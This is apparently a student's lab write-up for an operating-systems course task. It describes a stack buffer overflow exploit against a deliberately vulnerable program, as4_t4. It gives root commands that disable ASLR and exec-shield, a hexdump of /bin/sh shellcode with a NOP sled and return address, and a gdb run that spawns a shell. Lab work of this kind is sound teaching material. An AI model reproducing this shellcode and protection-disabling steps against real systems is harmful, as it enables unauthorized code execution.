# Documentation on task 4
-------------------------
## Preparation
To make sure all security measurements are turned off, run the following:

    $ sudo -i
    # echo 0 > /proc/sys/kernel/randomize_va_space
    # echo 0 > /proc/sys/kernel/exec-shield   

## How to create and run the exploit
This creates a file `exploit`, with a crafted string to run `/bin/sh` using the vulnerable `as4_t4`

    $ perl exploit.pl

It should look like this (check with `hexdump -C exploit`):

    00000000  31 c9 f7 e1 51 68 2f 2f  73 68 68 2f 62 69 6e 89  |1...Qh//shh/bin.|
    00000010  e3 b0 0b cd 80 90 90 90  90 90 90 90 90 90 90 90  |................|
    00000020  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
    *
    00000060  90 90 90 90 90 90 90 90  90 90 90 90 30 f6 ff bf  |............0...|
    00000070

You can see it working by entering:

    $ gdb ./as4_t4
    (gdb) run `cat exploit`
    Starting program: /home/oscourse/task-4/as4_t4 `cat exploit`
    process 2381 is executing new program: /bin/dash
    $ ls
    as4_t4	as4_t4.c  exploit  exploit.pl
 
## How we crafted the exploit
We figured out that the return address was set after 108 chars of input (which means 28 characters after `buf`, which has a length of 90 characters). At this place we wanted to insert the location for the given buffer, so the program would run shell code from our own buffer. We found that buffer address by recompiling the `as4_t4.c` (with buffer length now set to 96) so we could run it in `gdb` and set some breakpoint on a certain line (we used as4_t4.c:8, just after the overflow). At the break we could use the command `p/x &buf` to see the buffer's location and could confirm by repeating this procedure it wouldn't change over time. The location was therefore `0xbffff630` (see last 4 bytes of the hexdump).
 
We've used [this shellcode](http://www.shell-storm.org/shellcode/files/shellcode-517.php) to spawn `/bin/sh`. This is set at the beginning of the buffer (see lines 00-10). The middle part is stuffing with NOP (lines 10-60) till we are at 108 bytes and add the aforementioned return address.